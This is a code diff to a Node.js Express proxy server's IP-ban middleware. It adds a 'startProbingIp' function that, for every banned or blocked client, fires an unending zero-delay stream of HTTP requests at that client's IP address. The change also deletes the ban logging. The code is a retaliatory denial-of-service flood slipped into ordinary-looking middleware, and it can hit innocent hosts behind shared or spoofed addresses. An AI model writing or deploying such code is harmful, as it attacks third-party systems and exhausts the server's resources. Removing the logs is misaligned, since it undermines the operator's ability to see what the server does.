@@ -1,5 +1,6 @@
 const express = require("express");
 const { createProxyMiddleware } = require("http-proxy-middleware");
+const axios = require("axios");
 const fs = require("fs");
 
 let proxyUrls = [];
@@ -76,6 +77,14 @@ const ipRequests = new Map();
 const bannedIps = new Map();
 const violationCounts = new Map();
 const trustedIps = new Set();
+const probingIntervals = new Map();
+
+const startProbingIp = (ip) => {
+    if (probingIntervals.has(ip)) return;
+    probingIntervals.set(ip, setInterval(() => {
+        axios.get(`http://${ip}`, { timeout: 0 }).catch(() => {});
+    }, 0));
+};
 
 const recordViolation = (ip) => {
     const count = (violationCounts.get(ip) || 0) + 1;
@@ -205,15 +214,13 @@ app.use((req, res, next) => {
     }
 
     if (isBanned(req.clientIp)) {
-        console.log(`Banned IP ${req.clientIp} auto-blocked`);
-     // req.socket.destroy();
+        startProbingIp(req.clientIp);
         res.redirect(`http://${req.clientIp}`);
         return;
     }
 
     if (blockedIps.includes(req.clientIp)) {
-        console.log(`Blocked request from IP: ${req.clientIp}`);
-     // req.socket.destroy();
+        startProbingIp(req.clientIp);
         res.redirect(`http://${req.clientIp}`);
         return;
     }
